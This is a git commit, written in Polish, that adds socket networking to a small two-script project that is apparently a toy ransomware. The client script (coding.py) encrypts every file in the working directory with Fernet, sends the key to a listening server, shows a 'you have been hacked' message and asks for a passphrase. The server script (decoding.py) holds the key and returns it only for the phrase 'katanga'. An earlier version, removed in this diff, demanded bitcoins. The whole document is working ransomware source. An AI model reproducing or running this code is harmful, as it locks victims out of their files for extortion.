a78700391b7e7d0ff39bcaf8cea71765f5398bbe
Skafil <filipsuska20@gmail.com>
2023-07-16 10:07:50 +0200

    Dodano sockety

--- coding.py
+++ coding.py
@@ -2,23 +2,73 @@
 
 import os
 from cryptography.fernet import Fernet
+import socket
 
-files = []
+# Zmienne potrzebne od ustanowienia połączenia z serwerem.
+HOST = socket.gethostbyname(socket.gethostname()) # Wyslij na loopback.
+PORT = 40445  # Wybrany losowo
+BUFFER_SIZE = 4096
+BYTEORDER_LENGTH = 8 # We don't need big buffer size to send size of file
+FORMAT = "utf-8"
 
-for file in os.listdir():
-        if file == "coding.py" or file == "crypto_key.key" or file == "decoding.py":
-          continue
-        if os.path.isfile(file):
-          files.append(file)
+# Nawiąż połączenie z serwerem.
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
 
-key = Fernet.generate_key()
 
-with open("crypto_key.key", "wb") as key_file:
-  key_file.write(key)
+def main():
+    files = []
 
-for file in files:
-      with open(file, "rb") as crypto_file:
-        contents = crypto_file.read()
-      contents_encrypted = Fernet(key).encrypt(contents)
-      with open(file, "wb") as crypto_file:
-          crypto_file.write(contents_encrypted)
+    # Znajdź wszystkie pliki i wrzuć do listy poza pewnymi wyjątkami.
+    for file in os.listdir():
+            if (file == "coding.py") or (file == "crypto_key.key") or (file == "decoding.py") or (file == "instrukcja.txt"):
+              continue
+            if os.path.isfile(file):
+              files.append(file)
+
+    # Wygeneruj klucz i zaszyfruj nim pliki.
+    key = Fernet.generate_key()
+
+    for file in files:
+        with open(file, "rb") as crypto_file:
+            contents = crypto_file.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as crypto_file:
+            crypto_file.write(contents_encrypted)
+    
+    
+
+    # (1) Wyślij klucz do serwera
+    s.send(key)
+
+    # Poproś o słowo klucz.
+    print("[i] Zostales shakowany. Ha HA ha! Jestesmy na tyle mili, ze jak podasz slowo klucz, to odszyfrujemy Twoje pliki.")
+    user_phase = str(input("Podaj slowo klucz: "))
+
+    # (2) Wyślij słowo klucz do serwera.
+    s.send(user_phase.encode(FORMAT))
+
+    # (3) Odbierz odpowiedz od serwera dotyczaca slowa klucz.
+    res = s.recv(BUFFER_SIZE).decode(FORMAT)
+    
+    if(res == 'ACK'):
+        # (4) Odbierz klucz od serwera.
+        print("[+] Podano prawidłowe słowo klucz, trwa odszyfrowywanie plików...")
+        key = s.recv(BUFFER_SIZE)
+
+        # Odszyfruj pliki.
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+            contents_decrypted = Fernet(key).decrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_decrypted)
+        print("[+] Pliki odszyfrowane. Nastepnym razem uwazaj!")
+    
+    else:
+        print("[-] Podano złe słowo klucz, już nigdy nie odszyfrujesz tych plików!")
+    
+    s.close()
+
+main()
+
--- decoding.py
+++ decoding.py
@@ -1,31 +1,66 @@
-# To robil F
-
 import os
 from cryptography.fernet import Fernet
+import socket
 
-files = []
+# Zmienne potrzebne od ustanowienia połączenia z klientem.
+HOST = socket.gethostbyname(socket.gethostname()) # Wyslij na loopback.
+PORT = 40445  # Wybrany losowo
+BUFFER_SIZE = 4096
+BYTEORDER_LENGTH = 8 # We don't need big buffer size to send size of file
+FORMAT = "utf-8"
 
-for file in os.listdir():
-    if (file == "decoding.py") or (file == "coding.py") or (file == "crypto_key.key"):
-        continue
-    if os.path.isfile(file):
-        files.append(file)
 
-key = ""
-secret_phase = "katanga"
+# Nawiąż połączenie z klientem.
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(5) # Nasłuchuj max 5 połączeń
 
-user_phase = str(input("[i] Zostales shakowany. Ha HA ha! Jestesmy na tyle mili, ze jak podasz slowo klucz, to odszyfrujemy te pliki."))
+def main():
+    files = []
+    secret_phase = "katanga"
 
-if user_phase == secret_phase:
-    with open("crypto_key.key", "rb") as thekey:
-        key = thekey.read()
+    # Znajdź wszystkie pliki i wrzuć do listy poza pewnymi wyjątkami.
+    for file in os.listdir():
+        if (file == "decoding.py") or (file == "coding.py") or (file == "crypto_key.key")  or (file == "instrukcja.txt"):
+            continue
+        if os.path.isfile(file):
+            files.append(file)
 
-    for file in files:
-        with open(file, "rb") as thefile:
-            contents = thefile.read()
-        contents_decrypted = Fernet(key).decrypt(contents)
-        with open("file", "wb") as thefile:
-            thefile.write(contents_decrypted)
-    print("[+] Pliki odszyfrowane. Nastepnym razem uwazaj!")
-else:
-    print("[-] Slowo klucz nie prawidlowe, prosze przeslac bitcoiny.")
+    # Serwer zaakceptował połączenie z klientem. Od tego momentu
+    # Używamy zmiennej "conn" zamiast "s".
+    conn, addr = s.accept()
+
+    # (1) Odbierz klucz od klienta
+    key = conn.recv(BUFFER_SIZE)
+    
+    # Zapisz klucz do pliku
+    with open("crypto_key.key", "wb") as thekey:
+        thekey.write(key)
+
+    # (2) Odbierz słowo klucz od klienta.
+    user_phase = conn.recv(BUFFER_SIZE).decode(FORMAT)
+    # print("[i] Serwer krok (2). user_phase: ", user_phase)
+    # print("[i] Serwer - secret_phrase: ", secret_phase)
+    # print("[i] Serwer - porównanie phrase: ", secret_phase == user_phase)
+    if user_phase == secret_phase:
+
+        # (3) Potwierdz, ze podano dobre slowo klucz
+        conn.send("ACK".encode(FORMAT))
+        print("[+] Serwer - wyslano ACK (3)")
+
+        # Odczytaj klucz z serwera
+        with open("crypto_key.key", "rb") as thekey:
+            key = thekey.read()
+
+        # (4) Wyslij klucz do klienta
+        conn.send(key)
+        print("[+] Serwer - wyslano klucz (4)")
+    
+    else:
+        # (3) Podano zle slowo klucz
+        s.send('NACK'.encode(FORMAT))
+        print("[-] Serwer - wyslano NACK (3)")
+    
+    conn.close()
+
+main()
